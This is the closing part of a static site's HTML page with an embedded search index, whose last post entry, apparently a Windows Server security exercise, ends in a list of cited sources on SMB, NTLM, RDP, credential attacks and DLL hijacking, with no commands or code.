source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMicrosoft Community Hub. Controlling SMB Dialects. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWikipedia. NTLMSSP. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMicrosoft Docs. [MS-SMB2]: SMB2 SESSION_SETUP Request. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWindows OS Hub. Managing Administrative Shares (Admin$, IPC$, C$) on Windows. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWikipedia. Remote Desktop Protocol. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMicrosoft Docs. Credential Security Support Provider - Win32 apps. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCloudflare. What happens in a TLS handshake? source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nGitHub. devnulli/EvlWatcher: a \u0026ldquo;fail2ban\u0026rdquo; style modular log file analyzer for windows. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWindows OS Hub. Disable NTLM Authentication in Windows. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe Windows Club. How to restrict the number of Login attempts in Windows 11/10. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMedium. Detailed mimikatz guide. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCrowdStrike. What is a Pass-the-Hash Attack? source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMITRE ATT\u0026amp;CK. Use Alternate Authentication Material: Pass the Ticket. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nPowerSploit. PowerShellMafia/PowerSploit. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nJohn Hammond. this MP3 file is malware. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHijackLibs. dismcore.dll on HijackLibs. source\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n", 
        "url": "http:\/\/localhost:1313\/posts\/itsi\/exercise-9\/security-test-of-windows-server\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
}
</script>


    <script defer src="/js/lunr.js"></script>
    <script defer src="/js/search.js"></script>


</footer>

</body>
</html>

